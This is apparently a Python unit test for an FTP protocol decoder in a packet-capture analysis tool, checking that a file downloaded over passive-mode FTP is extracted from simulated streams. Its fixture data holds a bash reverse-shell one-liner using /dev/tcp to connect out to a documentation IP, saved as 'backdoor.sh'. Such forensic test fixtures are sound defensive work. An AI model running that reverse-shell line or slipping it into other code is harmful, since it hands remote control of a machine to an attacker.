import unittest

from pcap_decode.models import FlowKey, TcpStream
from pcap_decode.protocols.ftp import FtpDecoder


class TestFtpDecoder(unittest.TestCase):
    def test_ftp_passive_mode_download(self):
        decoder = FtpDecoder()

        control_stream = TcpStream(
            flow=FlowKey("192.168.1.50", 41234, "198.51.100.10", 21),
            start_time=10.0,
            end_time=12.0,
            client_to_server=b"USER anonymous\r\nPASS guest\r\nPASV\r\nRETR backdoor.sh\r\nQUIT\r\n",
            server_to_client=b"220 FTP Server ready\r\n331 Send password\r\n230 User logged in\r\n227 Entering Passive Mode (198,51,100,10,195,80)\r\n150 Opening data connection\r\n226 Transfer complete\r\n",
        )
        decoder.parse_stream(control_stream)

        data_stream = TcpStream(
            flow=FlowKey("192.168.1.50", 41235, "198.51.100.10", 50000),
            start_time=11.0,
            end_time=11.5,
            client_to_server=b"",
            server_to_client=b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/198.51.100.10/4444 0>&1\n",
        )

        extracted = decoder.parse_stream(data_stream)
        self.assertEqual(len(extracted), 1)
        item = extracted[0]
        self.assertEqual(item["filename"], "backdoor.sh")
        self.assertIn(b"#!/bin/bash", item["data"])
        self.assertEqual(item["source_protocol"], "FTP")


if __name__ == "__main__":
    unittest.main()
